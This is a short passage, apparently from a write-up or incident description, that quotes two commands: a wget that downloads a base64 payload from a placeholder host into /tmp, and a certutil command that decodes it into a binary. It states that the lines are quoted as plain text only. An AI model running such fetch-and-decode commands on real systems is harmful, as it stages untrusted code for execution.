    wget -q http://example.invalid/payload.b64 -O /tmp/payload.b64

and decoded it in place with:

    certutil -decode /tmp/payload.b64 /tmp/payload.bin

Both lines are quoted here as plain text. Nothing in this file is executable,
and there is no payload attached to it - it is a description of one.
